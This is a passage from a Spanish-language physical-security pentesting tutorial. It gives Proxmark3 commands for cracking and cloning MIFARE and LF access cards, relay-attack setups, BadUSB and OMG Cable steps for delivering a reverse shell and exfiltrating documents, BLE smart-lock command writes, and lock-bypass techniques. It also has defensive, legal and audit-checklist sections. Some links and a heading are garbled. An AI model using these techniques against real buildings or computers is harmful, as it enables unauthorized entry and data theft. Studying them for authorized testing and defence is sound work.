**2. Backdoor PIN (de fabrica):** Muchos teclados tienen PINs de fabrica que no se desactivan: 9999, 0000, 1234, master code.

**3. Wire tapping:** El teclado envia el PIN al panel en texto plano por Wiegand o serial.

**4. Biometric bypass:**
- Huellas falsas (gelatin, silicona)
- Sensor sucio que lee cualquier cosa
- Fallback a PIN cuando el biometrico falla

<a name="magnetic-bypass"></a>
### 7.5 Magnetic lock bypass

Las cerraduras magneticas (mag locks) usan un electroiman para mantener la puerta cerrada.

**Bypass techniques:**
1. **Cortar la corriente:** Si el mag lock no tiene respaldo de bateria, cortar la luz la abre.
2. **Imán mas potente:** Un iman de neodimio puede vencer al electroiman.
3. **Bypass del sensor de puerta:** Muchos mag locks tienen un sensor de puerta cerrada que se puede engañar.
4. **Golpe seco:** Un golpe fuerte en la direccion correcta puede separar la placa del iman.

<a name="ejercicios-physical"></a>
### 7.6 Ejercicios practicos

**Ejercicio 1:** Relay attack simulado
1. Consigue dos Proxmark3
2. Configura uno como sniffer y otro como emulador
3. Coloca el sniffer cerca de la tarjeta de un colega (con permiso)
4. Retransmite la senal al emulador cerca del lector
5. El lector abre la puerta

**Ejercicio 2:** By-passear un mag lock
1. Identifica si el mag lock tiene respaldo de bateria
2. Prueba un iman de neodimio de 50kg+ contra la placa
3. Prueba forzar la puerta con un golpe seco

**Ejercicio 3:** Audit de tailgating
1. Parate cerca de la entrada de un edificio (en la via publica)
2. Cuenta cuantas personas pasan sin tarjeta siguiendo a alguien
3. Calcula el porcentaje de exito de tailgating
4. Reporta los resultados (sin revelar datos sensibles)



<a name="tools-hardware"></a>
## 8. Tools: Hardware para hacking [fisico](../raw/ph7s1c4l-r3d.md)

<a name="pm3-comparativa"></a>
### 8.1 Proxmark3 Easy vs RDV4: comparativa detallada

**Proxmark3 Easy:**
- Ventajas: Barato, mismo FPGA que RDV4, gran comunidad
- Desventajas: Sin bateria, sin BT, antena externa fragil
- Ideal para: Aprendizaje, laboratorio casero
- Precio: $50-80 USD

**Proxmark3 RDV4:**
- Ventajas: Bateria integrada, Bluetooth, antena integrada, GPIO, case impreso
- Desventajas: Mas caro, bateria dura 2-3 horas
- Ideal para: Pentests profesionales, fieldwork
- Precio: $250-300 USD

**Donde comprar:**
- Aliexpress (Easy, $50-80)
- Lab401.[com](../raw/w1n-s9bsyst3ms.md#com) (RDV4 original, $280)
- HackerWarehouse (RDV4, $250)
- MercadoLibre Argentina (a veces hay, sobreprecio)

<a name="flipper-zero"></a>
### 8.2 Flipper Zero

Flipper Zero es un dispositivo multi-herramienta para pentesting [fisico](../raw/ph7s1c4l-r3d.md). Se hizo famoso por su comunidad y su interfaz gamificada.

**Capacidades [rfid](../raw/ph7s1c4l-r3d.md#rfid):**
- Lectura de LF (125kHz): HID, EM4100, Indala
- Lectura de HF (13.56MHz): MIFARE Classic, Ultralight, NTAG
- Emulacion de tarjetas (store en memoria)
- Sniffing basico
- NO soporta escritura a tarjetas blanks (solo lectura)

**Otras capacidades:**
- IR (infrarrojo): Control remotos, TVs, aires acondicionados
- iButton (Dallas): Lectura de keys de temperatura/humedad
- GPIO: Conectar sensores externos
- [badusb](../raw/ph7s1c4l-r3d.md#badusb): Actua como teclado USB (DuckyScript)
- Sub-1GHz: Garages, alarmas (433/868MHz)
- NFC: Pagos, tags

**Limitaciones:**
- No escribe tarjetas (necesitas PM3 para eso)
- No tiene antena direccional (alcance limitado)
- Sub-1GHz solo receive en algunos rangos
- La emulacion NFC no funciona con todos los lectores

<a name="chameleonmini"></a>
### 8.3 ChameleonMini

ChameleonMini es un emulador de tarjetas RFID, originalmente creado para la competencia de hacking RFID de DEF CON.

**Capacidades:**
- Emula hasta 8 tarjetas simultaneamente
- Soporta: MIFARE Classic, DESFire, Ultralight, iClass, HID
- Configurable via USB
- Open source (hardware y [firmware](../raw/u3f1-r00tk1ts.md#firmware))

**Uso tipico:**
1. Clonar una tarjeta con PM3
2. Cargar el dump en ChameleonMini
3. Usar ChameleonMini para abrir puertas (llevas 8 tarjetas en un dispositivo)

<a name="hackrf-sdr"></a>
### 8.4 [HackRF](../raw/sdr-t3l3c0ms.md#hackrf): [SDR](../raw/sdr-t3l3c0ms.md) para RF

HackRF es un [software defined radio](../raw/sdr-t3l3c0ms.md) que puede transmitir y recibir de 1MHz a 6GHz.

**Usos en [hacking fisico](../raw/ph7s1c4l-r3d.md):**
- Analisis de senales de control remoto (garages, alarmas)
- Replay de senales RF
- Reverse engineering de protocolos propietarios
- Sniffing de RFID (con antena adecuada)

**Limitaciones:**
- Half-duplex (no puede transmitir y recibir simultaneamente)
- No tiene suficiente potencia para clonar RFID pasivo
- Requiere antenas externas

<a name="omg-cable"></a>
### 8.5 OMG Cable

OMG Cable parece un cable de carga USB normal pero tiene un ESP8266/ESP32 adentro.

**Caracteristicas:**
- Parece un cable USB-C o Lightning
- Tiene [wifi](../raw/w1f1-4tt4cks.md) (ESP8266)
- Puede actuar como teclado HID
- Puede exfiltrar datos via WiFi
- Control remoto desde un [navegador](../raw/br0ws3r-3xpl01t4t10n.md)

**Ataques tipicos:**
1. Conectar el cable a la PC de la victima
2. Esperar a que se cargue el [payload](../raw/m3t4spl01t.md#payloads)
3. Abrir [reverse shell](../raw/r3v3rs3-sh3lls.md#reverse-shells) via WiFi
4. Exfiltrar documentos

<a name="bash-bunny"></a>
### 8.6 Bash Bunny

Bash Bunny (Hak5) es el dispositivo HID mas avanzado.

**Modos de ataque:**
- HID: Teclado + raton
- STORAGE: Almacenamiento masivo (exfiltracion)
- RNDIS: Ethernet over USB
- SERIAL: [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) serial

**Payloads populares:**
- **QuickCreds:** Dumpea credenciales de Windows
- **[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell) [empire](../raw/r3v3rs3-sh3lls.md#empire):** Stager para [empire](../raw/r3v3rs3-sh3lls.md#empire)
- **SMBGhost:** Explota [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-0796
- **[mimikatz](../raw/p4ssw0rd-4tt4cks.md#mimikatz):** Extrae hashes de memoria

<a name="ejercicios-tools"></a>
### 8.7 Ejercicios practicos

**Ejercicio 1:** Comparativa PM3 vs Flipper Zero
1. Lee una tarjeta MIFARE con ambos dispositivos
2. Compara: tiempo de lectura, informacion obtenida, facilidad de uso
3. Documenta las diferencias

**Ejercicio 2:** Setup de ChameleonMini
1. Clona una tarjeta MIFARE con PM3
2. Carga el dump en ChameleonMini
3. Configura ChameleonMini para emular la tarjeta
4. Prueba en un lector (con [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion))

**Ejercicio 3:** OMG Cable - payload delivery
1. Flashea un ESP8266 con firmware OMG Cable
2. Configura el payload para deliver una reverse shell
3. Conecta el cable a una PC de prueba
4. Verifica que la shell se ejecuta



<a name="referencias-fisico"></a>
## 10. Referencias

**Hardware:**
- Proxmark3: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/RfidResearchGroup/proxmark3
- Flipper Zero: https://flipperzero.one/
- ChameleonMini: https://github.com/emsec/ChameleonMini
- [HackRF](../raw/sdr-t3l3c0ms.md#hackrf): https://greatscottgadgets.com/hackrf/
- USB [rubber ducky](../raw/ph7s1c4l-r3d.md#rubber-ducky): https://shop.hak5.org/products/usb-rubber-ducky
- Bash Bunny: https://shop.hak5.org/products/bash-bunny
- OMG Cable: https://shop.hak5.org/products/omg-cable

**[lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking):**
- Lockpicking 101: https://lockpicking101.com/
- Sparrows Lock Picks: https://sparrowslockpicks.com/
- BosnianBill (YouTube): https://youtube.com/user/bosnianbill

**[rfid](../raw/ph7s1c4l-r3d.md#rfid) Security:**
- Proxmark3 Wiki: https://github.com/RfidResearchGroup/proxmark3/wiki
- MIFARE Classic weaknesses: https://eprint.iacr.org/2008/468.pdf
- RFIDiot ([python](../raw/pyth0n-f0r-h4ck1ng.md)): https://github.com/exploitagency/rfidiot

**HID Attacks:**
- USB Rubber Ducky Payloads: https://github.com/hak5/usbrubberducky-payloads
- DuckyScript Documentation: https://docs.hak5.org/
- Arduino Keyboard: https://www.arduino.cc/en/Reference/Keyboard

**Wiegand / OSDP:**
- Wiegand Protocol Whitepaper: https://www.hidglobal.com/
- OSDP Standard: https://www.securityindustry.org/

**Libros:**
- Practical Lock Picking - Deviant Ollam
- Keys to the Kingdom - Deviant Ollam
- RFID Security - Frank Thornton

**Comunidad:**
- EKOPARTY Security Conference (Argentina)
- DragonJAR Colombia
- TOOOL (The Open Organisation Of Lockpickers)
- DEF CON [physical security](../raw/ph7s1c4l-r3d.md) Village

**Canales de YouTube:**
- Deviant Ollam: Physical security talks
- BosnianBill: Lockpicking reviews
- LockPickingLawyer: Abre cualquier cerradura
- Matt Brown: RFID hacking, Proxmark3

---

*Fin del tutorial Ph7s1c4l-R3d - Creado por el equipo de [forense](../raw/w1n-f0r3ns1cs.md#forense)*


<a name="deep-dive-proxmark3"></a>
## 11. Proxmark3: Deep Dive

<a name="pm3-advanced-commands"></a>
### 11.1 Comandos avanzados

**Ataque de [diccionario](../raw/p4ssw0rd-4tt4cks.md#ataque-de-diccionario) masivo:**
```bash
# keys.dic debe contener keys en hex, una por linea
# Ejemplo: FFFFFFFFFFFF, A0A1A2A3A4A5, etc.
[usb] pm3 --> hf mf chk *1 d /path/to/keys.dic
```

**Darkside attack (ataque de noce debil):**
```bash
# Funciona contra MIFARE Classic con RNG debil
# Solo necesita 2-3 intentos por sector
[usb] pm3 --> hf mf darkside
```

**Nested attack:**
```bash
# Si tenes una key de UN sector, podes obtener las otras
[usb] pm3 --> hf mf nested 1 A FFFFFFFFFFFF d dump.dat
```

**Hardnested attack (ataque masivo):**
```bash
# Ataque optimizado, usa todas las nonces disponibles
# Puede tardar de 1 minuto a 24 horas
[usb] pm3 --> hf mf hardnested
```

<a name="pm3-magic-cards"></a>
### 11.2 Magic Cards (UID writable)

Las Magic Cards son tarjetas chinas que permiten escribir el UID (normalmente el UID es de solo lectura).

**Tipos de Magic Cards:**
| Tipo | Descripcion | Comando |
|------|-------------|---------|
| Gen1 (Magic) | UID escribible con comando especial | hf mf csetuid |
| Gen2 (MAGIC) | UID + blocks escribibles | hf mf wrbl |
| Gen3 (UID) | Similar a Gen2 | hf mf csetuid |
| CUID | UID modificable, bloquea despues de escribir | hf mf esetuid |

**Escribir UID en Magic Card:**
```bash
[usb] pm3 --> hf mf csetuid --uid 0x12345678
```

<a name="pm3-firmware-custom"></a>
### 11.3 Custom [firmware](../raw/u3f1-r00tk1ts.md#firmware) modifications

Se puede modificar el firmware del PM3 para agregar funcionalidades.

**Compilar firmware custom:**
```bash
# Modificar el codigo en armsrc/
vim armsrc/mifarecmd.c  # Agregar comandos custom

# Compilar
make -j$(nproc)

# Flashear
./pm3-flash bootrom/obj/bootrom.elf armsrc/obj/fullimage.elf
```

<a name="flipper-advanced"></a>
## 12. Flipper Zero: Deep Dive

<a name="flipper-rfid"></a>
### 12.1 [rfid](../raw/ph7s1c4l-r3d.md#rfid) con Flipper

**Leer LF (125kHz):**
```
Main Menu -> RFID -> Read
# Acercar tarjeta al Flipper
# Muestra: tipo, UID, datos
```

**Emular LF:**
```
Main Menu -> RFID -> Saved -> Seleccionar -> Emulate
# Flipper se comporta como la tarjeta
```

**Leer HF (13.56MHz - NFC):**
```
Main Menu -> NFC -> Read
# Soporta: MIFARE Classic, Ultralight, NTAG
# NO soporta DESFire ni iClass completamente
```

<a name="flipper-scripts"></a>
### 12.2 [badusb](../raw/ph7s1c4l-r3d.md#badusb) con Flipper

Flipper Zero tiene modo BadUSB (teclado).

**Subir [payload](../raw/m3t4spl01t.md#payloads) DuckyScript:**
```
1. Copiar inject.txt a SD:/badusb/
2. Main Menu -> BadUSB -> Seleccionar payload
3. Conectar a PC target
4. Ejecutar
```

**Script de ejemplo:**
```duckyscript
REM Flipper Zero BadUSB Payload
DELAY 1000
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 500
STRING Hello from Flipper!
```

<a name="flipper-gpio"></a>
### 12.3 GPIO y modulos externos

Flipper tiene pines GPIO para conectar sensores externos.

**Pines disponibles:**
- 5V, 3.3V, GND
- UART TX/RX
- I2C SDA/SCL
- SPI MOSI/MISO/CS/SCK
- PWM
- Analog input

**Usos:**
- Conectar antena externa para mayor alcance RFID
- Conectar sensor de temperatura
- Conectar modulos [wifi](../raw/w1f1-4tt4cks.md) (ESP32)
- Conectar relay para controlar dispositivos

<a name="advanced-lockpicking"></a>
## 13. [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) Avanzado

<a name="security-pins"></a>
### 13.1 Security pins

**Spool pins:**
- Forma de carrete (angosto en el medio)
- Dan un "false [set](../raw/ph1sh1ng.md#social-engineering-toolkit)" cuando se enganchan
- Sentir: el plug gira un poco y se traba
- Solucion: liberar tension hasta que el pin retroceda, luego setearlo

**Serrated pins:**
- Tienen muescas (dientes de sierra)
- Dan multiples clicks falsos
- Sentir: parece que se setea pero sigue dando click
- Solucion: contar los clicks, el ultimo es el verdadero

**Mushroom pins:**
- Forma de hongo
- Similar a spools pero mas sutiles

<a name="jiggle-test"></a>
### 13.2 Jiggle test y identificacion de pins

**Jiggle test:**
1. Aplicar tension
2. Probar cada pin con el pick
3. Pin que no se mueve: binding pin (setearlo)
4. Pin que se mueve libremente: no binding
5. Pin que rebota: ya esta seteado

**Identificar tipo de pin:**
- **Standard:** Click definido, no rebota
- **Spool:** False set, necesita contra-tension
- **Serrated:** Multiples clicks, se siente áspero

<a name="high-security-locks"></a>
### 13.3 Cerraduras de alta seguridad

**Medeco:**
- Pins con angulo (no solo subir, tambien rotar)
- Sidebar adicional
- Herramienta especial: Medeco pick
- Tiempo promedio de apertura con skill: 10-30 minutos

**Mul-T-Lock:**
- Pins telescopicos (inner + outer)
- Pin-in-pin: dos pins concéntricos
- Herramienta especial: MTL picks

**ABUS Plus:**
- Disco de seguridad adicional
- Spools + serrated combinados

**Disc detainer locks:**
- Usan discos en lugar de pins
- Herramienta especial: DD pick
- Comunes en candados de bicicleta

<a name="lock-manipulation"></a>
### 13.4 Tecnicas de manipulacion

**Decoding (lectura de llave):**
1. Insertar una llave en blanco en la cerradura
2. Marcar donde los pins tocan la llave
3. Limar las marcas
4. Probar la llave
5. Repetir hasta que funcione

**Impressioning:**
1. Insertar una llave en blanco sin limar
2. Girar con fuerza (los pins marcan la llave)
3. Limar las marcas
4. Repetir hasta que funcione

**Shimming:**
- Para candados de disco o wafer
- Insertar una lamina fina entre el hasp y el cuerpo
- Empujar los wafers hacia abajo

<a name="rfid-relay-theory"></a>
## 14. [rfid](../raw/ph7s1c4l-r3d.md#rfid) Relay Attack Theory

<a name="relay-types"></a>
### 14.1 Tipos de relay

**Relay pasivo (amplificacion de senal):**
- Usa un cable coaxial como antena
- Pones una antena cerca del lector, otra donde esta la tarjeta
- Alcance: 10-50 metros con cable coaxial
- Ventaja: Sin bateria, dispositivo pasivo
- Desventaja: Cable [fisico](../raw/ph7s1c4l-r3d.md) visible

**Relay activo (digital):**
- Dispositivo A: Lee la tarjeta, digitaliza, envia por radio/LTE/[wifi](../raw/w1f1-4tt4cks.md)
- Dispositivo B: Recibe los datos, emula la tarjeta
- Alcance: Ilimitado (via internet)
- Ventaja: Sin cable, largo alcance
- Desventaja: Bateria, latencia

**Ghost-n-lurk:**
- Tecnica de relay para ataques de proximidad
- El atacante se para cerca de la victima con un lector
- La senal se retransmite a un emulador cerca del lector de puerta
- La victima ni se entera

<a name="relay-hardware"></a>
### 14.2 Hardware para relay

**Setup con Proxmark3:**
```bash
# Dispositivo A (sniffer, cerca de victima)
[usb] pm3 --> hf sniff

# Dispositivo B (emulador, cerca de lector)
[usb] pm3 --> hf mf sim *1
```

**Setup con Flipper Zero + ESP32:**
```
1. Flipper Zero A: Lee tarjeta, envia UART a ESP32
2. ESP32 A: Envia por WiFi a ESP32 B
3. ESP32 B: Recibe, envia UART a Flipper Zero B
4. Flipper Zero B: Emula tarjeta
```

**Setup con [hackrf](../raw/sdr-t3l3c0ms.md#hackrf)-t3l3c0ms.md#[hackrf](../raw/sdr-t3l3c0ms.md#hackrf)):**
```bash
# Capturar senal
hackrf_transfer -r capture.bin -f 125000000 -s 4000000 -n 40000000

# Reproducir senal
hackrf_transfer -t capture.bin -f 125000000 -s 4000000 -x 40
```

<a name="electronic-locks"></a>
## 15. Cerraduras Electronicas y Smart Locks

<a name="smart-lock-vulns"></a>
### 15.1 Vulnerabilidades de smart locks

Las cerraduras inteligentes (August, Yale, Nuki, Lockly) tienen su propio conjunto de vulnerabilidades.

**1. Bluetooth LE weaknesses:**
- La mayoria usa BLE para comunicacion
- Sniffing BLE es posible con nRF52840 o similar
- Algunas no cifran los comandos

**2. Mobile app insegura:**
- API keys hardcodeadas en la app
- Tokens almacenados sin proteccion
- Comunicacion sin [tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)

**3. Backend inseguro:**
- APIs sin [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion)
- IDOR en endpoints de cerraduras
- Database leaks

**4. Falla de seguridad fisica:**
- La mayoria tiene un cilindro de emergencia (pin tumbler clasico)
- El cilindro de emergencia suele ser de baja calidad
- Se puede abrir con [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) en segundos

<a name="bluetooth-attacks"></a>
### 15.2 BLE attacks

**Herramientas:**
- nRF52840 Dongle + [wireshark](../raw/r3d3s-f0nd4m3nt0s.md#wireshark)
- BlueZ + gatttool (Linux)
- [android](../raw/4db-d33p-d1v3.md) + nRF Connect app

**Ataque basico:**
```bash
# Escanear dispositivos BLE
hcitool lescan

# Conectar a la cerradura
gatttool -b <MAC_ADDRESS> -I

# Leer caracteristicas
[00:11:22:33:44:55]> primary
[00:11:22:33:44:55]> characteristics

# Escribir comando de apertura
[00:11:22:33:44:55]> char-write-req <handle> <command>
```

<a name="rfid-legacy"></a>
## 16. Sistemas [rfid](../raw/ph7s1c4l-r3d.md#rfid) [legacy](../raw/l3g4cy-3nt3rpr1s3.md)

<a name="em4100"></a>
### 16.1 EM4100

EM4100 es un tag RFID LF de 125kHz, muy basico y sin seguridad.

**Leer EM4100:**
```bash
[usb] pm3 --> lf em 410x_read
```

**Clonar EM4100:**
```bash
[usb] pm3 --> lf em 410x_write --id 0x12345678
```

<a name="indala"></a>
### 16.2 Indala

Indala (Motorola/HID) usa un formato propietario de 26-48 bits.

**Leer Indala:**
```bash
[usb] pm3 --> lf indala read
```

**Clonar Indala a T55x7:**
```bash
[usb] pm3 --> lf indala clone --raw <hex_data>
```

<a name="awid"></a>
### 16.3 AWID

AWID es otro formato LF usado en sistemas de control de acceso.

```bash
[usb] pm3 --> lf awid read
[usb] pm3 --> lf awid sim --raw <hex>
```

<a name="t55x7-programming"></a>
### 16.4 T55x7: tarjetas programables

Las T55x7 son tarjetas LF programables que pueden emular multiples formatos.

**Leer configuracion:**
```bash
[usb] pm3 --> lf t55xx info
```

**Programar como HID:**
```bash
[usb] pm3 --> lf hid clone --fc 123 --card 45678
```

**Programar como EM4100:**
```bash
[usb] pm3 --> lf em 410x_write --id 0x12345678
```

**Escribir raw en T55x7:**
```bash
[usb] pm3 --> lf t55xx wipe  # Limpiar
[usb] pm3 --> lf t55xx write --blk 0 --data 0x12345678
```

<a name="countermeasures"></a>
## 17. Contramedidas y Defensa

<a name="defensive-rfid"></a>
### 17.1 Defensa contra [rfid](../raw/ph7s1c4l-r3d.md#rfid) cloning

**1. Migrar a tarjetas seguras:**
- MIFARE DESFire EV2/EV3 ([aes](../raw/crypt0-f0r-h4ck3rs.md#aes)-128, 3DES protegido)
- HID iClass SE (Secure Identity Object)
- HID Seos (la mas segura actualmente)

**2. [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) de dos factores:**
- Tarjeta + PIN
- Tarjeta + biometrico
- Tarjeta + smartphone (push notification)

**3. Monitoreo:**
- Detectar multiples accesos con la misma tarjeta en poco tiempo
- Detectar accesos fuera de horario
- Alarmas de puerta forzada

<a name="defensive-hid"></a>
### 17.2 Defensa contra HID attacks

**1. USB Device Control:**
- Solo permitir dispositivos HID de marcas conocidas
- Whitelist de VID/PID
- Bloquear Teensy (VID 16C0)

**2. Endpoint Protection:**
- Detectar escritura de teclado a alta velocidad
- Detectar comandos [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)/cmd sospechosos
- Bloquear conexiones salientes a [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) desconocidas

**3. Politicas:**
- Bloqueo automatico de pantalla (max 5 minutos)
- No dejar USBs conectadas
- Capacitacion del personal

<a name="defensive-physical"></a>
### 17.3 Defensa contra [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking)

**1. Cerraduras de alta seguridad:**
- Medeco, Mul-T-Lock, ABUS Plus, Abloy Protec
- Security pins (spools, serrated)
- Sidebar adicional

**2. Alarmas:**
- Sensor de vibracion en la puerta
- Sensor de puerta abierta
- Alarma antitaladro

**3. Control de acceso:**
- Auditoria de acceso (quien entro y cuando)
- Camaras en puntos criticos
- Personal de seguridad



<a name="physical-ctf"></a>
## 18. CTFs y Desafios de hacking [fisico](../raw/ph7s1c4l-r3d.md)

<a name="ctf-types"></a>
### 18.1 Tipos de desafios

**1. [rfid](../raw/ph7s1c4l-r3d.md#rfid) [ctf](../raw/ctf-h4ckth3b0x.md):**
- Clonar una tarjeta en el menor tiempo posible
- Extraer datos ocultos de una tarjeta MIFARE
- Romper el [cifrado](../raw/s3c-f0nd4m3nt0s.md#cifrado) de una tarjeta DESFire

**2. [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) CTF:**
- Abrir candados progresivamente mas dificiles
- Speed lockpicking: abrir X candados en el menor tiempo
- Blind lockpicking: abrir una cerradura sin verla

**3. [badusb](../raw/ph7s1c4l-r3d.md#badusb) CTF:**
- Escribir un [payload](../raw/m3t4spl01t.md#payloads) que extraiga una flag de un sistema
- By-passear protecciones USB
- Crear un payload que evade antivirus

**4. Hardware CTF:**
- Extraer [firmware](../raw/u3f1-r00tk1ts.md#firmware) de un chip
- Reverse engineering de un [protocolo](../raw/r3d3s-f0nd4m3nt0s.md#protocolos-de-red))
- Encontrar un backdoor en un dispositivo IoT

<a name="ekoparty-challenges"></a>
### 18.2 Desafios en Ekoparty

Ekoparty (Argentina) tiene uno de los mejores Lockpick Villages de Latinoamerica.

**Lockpick Village:**
- Estaciones con candados de dificultad creciente
- Instructores que te enseÃ±an las tecnicas
- Competencia de speed lockpicking
- Premios: sets de ganzuas

**Hardware Hacking Village:**
- Desafios de RFID con Proxmark3
- Soldadura y extraccion de firmware
- [sdr](../raw/sdr-t3l3c0ms.md) y radio frequency
- Desafios de BadUSB

<a name="defcon-challenges"></a>
### 18.3 Desafios en DEF CON

DEF CON tiene los villages mas grandes del mundo.

**[physical security](../raw/ph7s1c4l-r3d.md) Village:**
- Lockpicking (cientos de candados)
- RFID hacking
- Bypass de alarmas
- [social engineering](../raw/ph1sh1ng.md#ingenieria-social)

**Car Hacking Village:**
- [can bus](../raw/4ut0m0t1v3-s3c.md#can-bus) attacks
- Keyless entry systems
- ECU flashing

<a name="tools-comparison"></a>
## 19. Comparativa Detallada de Herramientas

<a name="comparison-table"></a>
### 19.1 Tabla comparativa

| Herramienta | [rfid](../raw/ph7s1c4l-r3d.md#rfid) LF | [rfid](../raw/ph7s1c4l-r3d.md#rfid) HF | [rfid](../raw/ph7s1c4l-r3d.md#rfid) Clonar | [badusb](../raw/ph7s1c4l-r3d.md#badusb) | [sdr](../raw/sdr-t3l3c0ms.md) | [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) | Precio |
|-------------|---------|---------|-------------|--------|-----|-------------|--------|
| Proxmark3 Easy | Si | Si | Si | No | No | No | $60 |
| Proxmark3 RDV4 | Si | Si | Si | No | No | No | $280 |
| Flipper Zero | Si | Parcial | No | Si | Parcial | No | $170 |
| ChameleonMini | No | Si | No | No | No | No | $80 |
| [hackrf](../raw/sdr-t3l3c0ms.md#hackrf) | Si (SDR) | Si (SDR) | No | No | Si | No | $300 |
| [rubber ducky](../raw/ph7s1c4l-r3d.md#rubber-ducky) | No | No | No | Si | No | No | $60 |
| Bash Bunny | No | No | No | Si | No | No | $120 |
| OMG Cable | No | No | No | Si | [wifi](../raw/w1f1-4tt4cks.md) | No | $80 |
| Arduino Micro | No | No | No | Si | No | No | $5 |
| Ganzuas | No | No | No | No | No | Si | $20 |

<a name="budget-setup"></a>
### 19.2 Setup recomendado por presupuesto

**Entry Level ($100):**
- Flipper Zero ($170) o Proxmark3 Easy ($60)
- Arduino Micro ($5)
- [set](../raw/ph1sh1ng.md#social-engineering-toolkit) de ganzuas basico ($20)
- Practice lock ($10)

**Mid Level ($500):**
- Proxmark3 RDV4 ($280)
- Bash Bunny ($120)
- Set de ganzuas profesional ($60)
- Set de practice locks ($40)

**Professional ($1500+):**
- Proxmark3 RDV4 + Flipper Zero ($450)
- Bash Bunny + OMG Cable ($200)
- HackRF ($300)
- Set completo de ganzuas ($100)
- Practice locks avanzados ($100)
- Osciloscopio ($300)

<a name="legal-argentina"></a>
## 20. Marco Legal en Argentina

<a name="codigo-penal"></a>
### 20.1 Codigo Penal Argentino

**Articulo 178:** "Sera reprimido con prision de quince dias a un ano, el que para hacerse de una llave verdadera o de una ganzua, o de cualquier otro instrumento destinado a cometer el delito de violacion de domicilio o de allanamiento, hubiere procedido a procurarselos sin la debida [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion)."

**Implicancia:** Tener ganzuas sin justificacion puede ser considerado "preparacion para cometer un delito". La justificacion valida es si sos cerrajero, pentester con autorizacion, o estudiante de seguridad.

<a name="consejos-legales"></a>
### 20.2 Consejos legales

1. **No lleves herramientas en la via publica** sin un estuche discreto
2. **Siempre trabaja con contrato firmado** que especifique las pruebas
3. **Documenta todo** con fotos, videos, y timestamps
4. **No publiques** informacion sensible o especifica de clientes
5. **No compartas** tecnicas de bypass de sistemas en produccion
6. **Etica:** Solo prueba sistemas donde tengas autorizacion explicita

<a name="recursos-adicionales"></a>
## 21. Recursos Adicionales

<a name="comunidades"></a>
### 21.1 Comunidades

- r/[lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking): Comunidad mas grande de [lockpicking](../raw/ph7s1c4l-r3d.md#lockpicking) en Reddit
- r/[rfid](../raw/ph7s1c4l-r3d.md#rfid): Discusion sobre [rfid](../raw/ph7s1c4l-r3d.md#rfid) security
- r/Proxmark3: Soporte para PM3
- r/FlipperZero: Comunidad de Flipper
- TOOOL Argentina: Grupo local de lockpicking
- Hardware Hacking Argentina: Grupo de WhatsApp/Telegram

<a name="cursos"></a>
### 21.2 Cursos y certificaciones

- Treadstone 71: [physical security](../raw/ph7s1c4l-r3d.md) Assessment
- SANS SEC573: Automating Information Security with [python](../raw/pyth0n-f0r-h4ck1ng.md)
- SANS SEC760: Advanced [exploit](../raw/m3t4spl01t.md#exploits) Development
- Certified [red team](../raw/r3d-t34m-1nfr4.md) Professional (CRTP): Incluye aspectos fisicos
- Offensive Security Wireless Professional (OSWP): Incluye RFID

<a name="checklist-final"></a>
### 21.3 Checklist de auditoria fisica

```markdown
# Physical Security Audit Checklist

## Pre-Audit
- [ ] Contrato firmado (alcance, limitaciones)
- [ ] Coordinacion con seguridad del cliente
- [ ] Preparar herramientas (PM3, ganzuas, BadUSB, camara)
- [ ] Preparar documentacion y formatos de reporte

## Exterior
- [ ] Perimetro: cercos, muras, rejas
- [ ] Iluminacion exterior
- [ ] Camaras (cobertura, almacenamiento, monitoreo)
- [ ] Puertas de emergencia (cierran? alarmas?)
- [ ] Ventanas (rejas? sensores?)
- [ ] Estacionamiento (barrera, control)

## Interior - Acceso
- [ ] Tipo de tarjeta RFID (MIFARE, HID, iClass)
- [ ] Version de firmware del lector
- [ ] 2FA implementado?
- [ ] Mantrap o molinetes
- [ ] Personal de seguridad (cantidad, capacitacion)
- [ ] Protocolo de ingreso de visitas

## Interior - Oficinas
- [ ] Cerraduras en puertas de oficinas
- [ ] Estaciones de trabajo bloqueadas?
- [ ] Cableado visible/accesible
- [ ] IDF (distribution frames) asegurados?
- [ ] Proyectores, pantallas (no aseguradas?)

## Server Room / Data Center
- [ ] Puerta del server room (tipo de cerradura, 2FA)
- [ ] Piso falso / falso techo (acceso alternativo?)
- [ ] Racks asegurados con llave
- [ ] Switches con puerto consola accesible
- [ ] iDRAC/iLO/iBMC con credenciales default
- [ ] Backups en cinta (asegurados?)
- [ ] Control de temperatura/humedad
- [ ] Extintores (fechas, tipo)

## Testing
- [ ] Probar clonacion de tarjeta RFID
- [ ] Probar tailgating
- [ ] Probar lockpicking en cerraduras autorizadas
- [ ] Probar BadUSB en estaciones autorizadas
- [ ] Probar Wiegand tapping
- [ ] Probar relay attack

## Post-Audit
- [ ] Dejar todo como estaba
- [ ] Reporte preliminar (verbal)
- [ ] Reporte final (escrito, con evidencias)
- [ ] Recomendaciones priorizadas
- [ ] Reunion de cierre
```



<a name="hardware-tools-diy"></a>
## 22. DIY: Herramientas Caseras

<a name="diy-proxmark3"></a>
### 22.1 Antena direccional para PM3

Mejora el alcance de tu Proxmark3 con una antena direccional casera.

**Materiales:**
- Cable coaxil RG58 (50cm)
- Conector SMA
- Alambre de cobre esmaltado (0.5mm)
- Tubo de PVC (opcional para el mango)

**Construccion:**
1. Hacer 3 vueltas de alambre de 5cm de diametro
2. Conectar al centro del conector SMA
3. La malla del coaxil al exterior del SMA
4. Conectar al PM3
5. Alcance: de 5cm a 30cm

<a name="diy-arduino-rfid"></a>
### 22.2 Lector [rfid](../raw/ph7s1c4l-r3d.md#rfid) casero con Arduino

